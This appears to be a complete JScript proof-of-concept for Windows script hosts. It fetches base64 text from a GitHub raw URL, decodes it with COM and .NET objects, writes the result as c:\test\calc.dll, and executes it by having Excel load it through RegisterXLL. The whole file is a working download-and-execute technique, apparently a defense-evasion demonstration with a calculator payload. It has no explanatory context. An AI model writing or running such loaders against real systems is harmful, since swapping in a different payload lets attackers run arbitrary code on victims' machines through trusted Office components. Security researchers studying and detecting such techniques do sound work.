x="c:\\test\\calc.dll";
h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt",false);
h.Send();
enc=new ActiveXObject("System.Text.ASCIIEncoding");
length=enc.GetByteCount_2(h.ResponseText);
ba=enc.GetBytes_4(h.ResponseText);
transform=new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
ba=transform.TransformFinalBlock(ba, 0, length);
s=new ActiveXObject("ADODB.Stream");
s.Type=1;
s.Open();
s.Write(ba);	
s.SaveToFile(x,2);
new ActiveXObject("Excel.Application").RegisterXLL(x);
